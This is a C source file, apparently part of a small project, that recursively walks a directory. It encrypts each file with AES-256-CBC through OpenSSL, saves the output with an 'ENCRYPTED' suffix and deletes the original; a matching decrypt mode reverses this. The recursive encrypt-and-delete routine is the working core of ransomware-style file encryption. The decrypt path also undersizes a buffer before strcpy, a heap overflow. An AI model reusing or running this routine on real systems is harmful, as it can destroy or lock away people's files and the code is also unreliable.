//
// Created by NoFu1 on 4/20/22.
//

#include "crypt.h"

int lsRcrypt( char *path, char mode, char* key, char* iv){
        DIR *dir = opendir (path);
        if (dir) {
                struct dirent *dp;
                while ((dp = readdir(dir)) != NULL) {
                        if (dp->d_name[0] != '.') {
                                char *fullpath = malloc (strlen (path) + strlen (dp->d_name) + 2);
                                strcpy (fullpath, path);
                                strcat (fullpath, "/");
                                strcat (fullpath, dp->d_name);
                                if (dp->d_type == DT_DIR) {
                                        lsRcrypt(fullpath, mode, key, iv);
                                }
                                else {
                                        char postfix[] = "ENCRYPTED";
                                        FILE *input;
                                        FILE *output;
                                        char *encFullpath = malloc(sizeof(char));

                                        if (mode == 'e') {
                                                printf("Encrypting: %s\n", fullpath);
                                                encFullpath = (char *) realloc(encFullpath, strlen(fullpath) + strlen(postfix) + 2);
                                                strcpy(encFullpath, fullpath);
                                                strcat(encFullpath, postfix);
                                                input = fopen(fullpath, "rb");
                                                output = fopen(encFullpath, "wb");
                                                encryptfile(input, output, key, iv);
                                        }
                                        else {
                                                printf("Decrypting: %s\n", fullpath);
                                                encFullpath = (char *) realloc(encFullpath, strlen(fullpath));
                                                strcpy(encFullpath, fullpath);
                                                encFullpath[strlen(encFullpath)- strlen(postfix)] = '\0' ;
                                                input = fopen(fullpath, "rb");
                                                output = fopen(encFullpath, "wb");
                                                decryptfile(input, output, key, iv);
                                        }

                                        fclose(output);
                                        fclose(input);
                                        remove(fullpath);
                                        free (encFullpath);

                                }
                                free (fullpath);
                        }
                }
                closedir(dir);
        }
        else{
                fprintf (stderr, "\e[31m\n\nCan't open dir %s: %s\n\n\e[0m", path, strerror (errno));
                return 1;
        }
        return 0;
}

void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
        //Using openssl EVP to encrypt a file


        const unsigned bufsize = 4096;
        unsigned char* read_buf = malloc(bufsize);
        unsigned char* cipher_buf ;
        unsigned blocksize;
        int out_len;

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

        EVP_CipherInit(ctx,EVP_aes_256_cbc(),key,iv,1);
        blocksize = EVP_CIPHER_CTX_block_size(ctx);
        cipher_buf = malloc(bufsize+blocksize);

        // read file and write encrypted file until eof
        while(1)
        {
                int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
                EVP_CipherUpdate(ctx,cipher_buf,&out_len,read_buf, bytes_read);
                fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
                if(bytes_read < bufsize)
                {
                        break;//EOF
                }
        }

        EVP_CipherFinal(ctx,cipher_buf,&out_len);
        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

        free(cipher_buf);
        free(read_buf);
}

void decryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
        //Using openssl EVP to encrypt a file


        const unsigned bufsize = 4096; // bytes to read
        unsigned char* read_buf = malloc(bufsize); // buffer to hold file text
        unsigned char* cipher_buf ;// decrypted text
        unsigned blocksize;
        int out_len;

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

        EVP_CipherInit(ctx,EVP_aes_256_cbc(),key,iv,0); // 0 = decrypt 	1= encrypt
        blocksize = EVP_CIPHER_CTX_block_size(ctx);
        cipher_buf = malloc(bufsize+blocksize);

        // read file and write encrypted file until eof
        while(1)
        {
                int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
                EVP_CipherUpdate(ctx,cipher_buf,&out_len,read_buf, bytes_read);
                fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
                if(bytes_read < bufsize)
                {
                        break;//EOF
                }
        }
        EVP_CipherFinal(ctx,cipher_buf,&out_len);
        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

        free(cipher_buf);
        free(read_buf);
}